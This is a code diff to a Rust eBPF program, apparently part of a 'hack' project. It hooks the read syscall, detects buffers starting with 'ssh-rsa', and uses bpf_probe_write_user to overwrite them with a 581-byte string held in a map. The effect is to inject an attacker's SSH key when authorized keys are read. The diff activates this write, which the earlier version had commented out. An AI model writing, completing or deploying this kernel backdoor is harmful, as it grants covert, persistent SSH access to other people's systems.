@@ -13,9 +13,10 @@ use aya_ebpf::{
     EbpfContext,
 };
 use aya_log_ebpf::info;
-use core::ffi::c_str;
-use core::ffi::c_void;
-use core::mem;
+use core::{
+    ffi::{c_str, c_void},
+    mem,
+};
 use hack_new_common::{StringInfo, SyscallReadLogging};
 
 #[allow(non_upper_case_globals)]
@@ -95,7 +96,6 @@ fn sys_exit_read_check(ctx: TracePointContext) -> Result<u32, u32> {
     unsafe {
         if let Some(data) = map_buff_addrs.get(&pid_tgid) {
             let becheck = c_str::CStr::from_bytes_with_nul(b"ssh-rsa\0").unwrap();
-            let te = data.calling_size;
             let tmpbuf = data.buffer_addr;
 
             let mut str: [u8; 7] = [0; 7];
@@ -106,15 +106,19 @@ fn sys_exit_read_check(ctx: TracePointContext) -> Result<u32, u32> {
                 tmpbuf as *const c_void,
             );
 
-            if te != 4096 {
+            if becheck.to_bytes() != str {
                 return Ok(0);
             }
-            // bpf_probe_write_user(
-            //     tmpbuf as *mut c_void,
-            //     hook.as_ptr() as *const c_void,
-            //     hook.to_bytes_with_nul().len() as u32,
-            // );
-            info!(&ctx, "已经成功写入，地址是0x{:x}", { tmpbuf });
+
+            let index = 0;
+
+            if let Some(info) = string_array.get(index) {
+                let tobe = info.str;
+                bpf_probe_write_user(tmpbuf as *mut c_void, tobe.as_ptr() as *const c_void, 581);
+                info!(&ctx, "tmpbuf: 0x{:x}", tmpbuf);
+            } else {
+                return Err(0);
+            }
         } else {
             return Ok(0);
         }
